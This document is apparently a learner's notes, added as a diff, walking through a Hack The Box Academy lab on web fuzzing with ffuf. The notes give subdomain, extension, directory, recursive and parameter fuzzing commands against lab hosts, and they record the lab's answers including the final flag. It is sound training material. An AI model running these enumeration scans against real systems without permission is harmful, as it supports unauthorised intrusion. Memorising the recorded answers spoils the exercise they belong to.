@@ -1,0 +1,81 @@
+Evaluation on target:
+
+94.237.48.48:35111
+
+
+
+Run a sub-domain/vhost fuzzing scan on '*.academy.htb' for the IP shown above. What are all the sub-domains you can identify? (Only write the sub-domain name) 
+
+add the ip to a host :
+sudo sh -c 'echo "94.237.48.48 academy.htb" >> /etc/hosts'
+
+ffuf -w subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:35111/ -H 'Host: FUZZ.academy.htb' -fs 985
+
+result: test archive faculty
+
+sudo sh -c 'echo "94.237.48.48 test.academy.htb" >> /etc/hosts' &&
+sudo sh -c 'echo "94.237.48.48 archive.academy.htb" >> /etc/hosts' &&
+sudo sh -c 'echo "94.237.48.48 faculty.academy.htb" >> /etc/hosts'
+
+
+extensions fuzzing scan 
+
+ffuf -w web-extensions.txt:FUZZ -u http://academy.htb:35111/indexFUZZ
+
+result:  .php
+
+ffuf -w web-extensions.txt:FUZZ -u http://test.academy.htb:35111/indexFUZZ
+result: .php
+ffuf -w web-extensions.txt:FUZZ -u http://archive.academy.htb:35111/indexFUZZ
+result: .php
+ffuf -w web-extensions.txt:FUZZ -u http://faculty.academy.htb:35111/indexFUZZ
+result: .php7
+
+
+dir scan
+
+ffuf -w directory-list-2.3-small.txt:FUZZ -u http://academy.htb:35111/FUZZ
+
+//
+
+depth scan
+
+ffuf -w directory-list-2.3-small.txt:FUZZ -u http://academy.htb:35111/FUZZ -recursion -recursion-depth 1 -e .php7 -v
+result: //
+ffuf -w directory-list-2.3-small.txt:FUZZ -u http://test.academy.htb:35111/FUZZ -recursion -recursion-depth 1 -e .php -v
+result: //
+ffuf -w directory-list-2.3-small.txt:FUZZ -u http://archive.academy.htb:35111/FUZZ -recursion -recursion-depth 1 -e .php7 -v
+result: /courses
+ffuf -w directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:35111/FUZZ -recursion -recursion-depth 1 -e .php7 -v
+result: http://faculty.academy.htb:35111/courses/linux-security.php7
+
+94.237.62.195:41768
+http://faculty.academy.htb:41768/courses/linux-security.php7
+
+find parameters:
+
+ffuf -w burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:41768/courses/linux-security.php7?FUZZ=key -fs 774
+
+found:
+user
+
+ffuf -w burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:41768/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 774
+
+found:
+user
+username
+
+Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag? 
+
+try with a wordlist of common username or id
+
+ffuf -w directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:41768/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781
+
+found:
+http://faculty.academy.htb:41768/courses/linux-security.php7?username=harry
+
+curl http://faculty.academy.htb:41768/courses/linux-security.php7 -X POST -d 'username=harry' -H 'Content-Type: application/x-www-form-urlencoded'
+
+result: HTB{w3b_fuzz1n6_m4573r}
+
+You have just completed the Attacking Web Applications with Ffuf module!
